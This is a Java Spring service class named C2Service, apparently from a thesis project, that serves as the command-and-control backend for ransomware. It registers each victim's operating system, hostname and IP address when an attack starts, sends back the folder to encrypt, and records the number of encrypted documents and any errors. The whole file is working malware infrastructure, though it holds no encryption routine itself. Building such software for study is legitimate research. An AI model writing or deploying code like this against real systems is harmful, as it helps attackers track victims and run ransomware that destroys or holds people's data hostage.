package it.ssri.tesi.c2.service;

import it.ssri.tesi.c2.dto.VictimDto;
import it.ssri.tesi.c2.model.Configuration;
import it.ssri.tesi.c2.model.Victim;
import it.ssri.tesi.c2.repository.ConfigurationRepository;
import it.ssri.tesi.c2.repository.VictimRepository;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import java.time.Instant;
import java.util.Map;

@Slf4j
@Service
@RequiredArgsConstructor
public class C2Service {

    private final ConfigurationRepository configurationRepository;
    private final VictimRepository victimRepository;

    public VictimDto manageAttack(Map<String, String> data) {
        if(data.containsKey("action")) {
            if(data.get("action").equals("start")) {
                return startAttack(data);
            } else if(data.get("action").equals("end")) {
                return endAttack(data);
            } else if(data.get("action").equals("error") && data.containsKey("id")) {
                return onError(data);
            }
        }
        throw new IllegalStateException("Action not found");
    }

    private VictimDto startAttack(Map<String, String> data) {
        Configuration configuration = configurationRepository.findById("ENC_FOLDER").orElseGet(() -> {
            log.error("Configuration not found");
            return Configuration.builder().value("Test").build();
        });

        Victim victim = Victim.builder()
                .os(data.get("os"))
                .osVersion(data.get("os_version"))
                .hostName(data.get("host_name"))
                .ipAddress(data.get("ip_address"))
                .encryptedFolder(configuration.getValue())
                .startAttackDate(Instant.now())
                .build();

        victimRepository.save(victim);

        return VictimDto.builder()
                .id(victim.getId())
                .encryptedFolder(configuration.getValue())
                .build();
    }

    private VictimDto endAttack(Map<String, String> data) {
        String uuid = getUUID(data);
        Victim victim = victimRepository.findById(uuid).orElseGet(() -> {
            log.error("Victim with id {} not found", uuid);
            return null;
        });

        if(victim != null && victim.getEndAttackDate() == null) {
            victim.setEndAttackDate(Instant.now());
            victim.setTotDocsEncrypted(Integer.parseInt(data.get("tot_docs_encrypted")));
            victimRepository.save(victim);
        }

        return VictimDto.builder()
                .id(uuid)
                .build();
    }

    private VictimDto onError(Map<String, String> data) {
        String uuid = getUUID(data);
        Victim victim = victimRepository.findById(uuid).orElseGet(() -> {
            log.error("Victim with id {} not found", uuid);
            return null;
        });

        if(victim != null) {
            victim.setEndAttackDate(Instant.now());
            victim.setError(data.get("error"));
            victimRepository.save(victim);
        }

        return VictimDto.builder()
                .id(uuid)
                .build();
    }

    private static String getUUID(Map<String, String> data) {
        return data.get("id");
    }

}
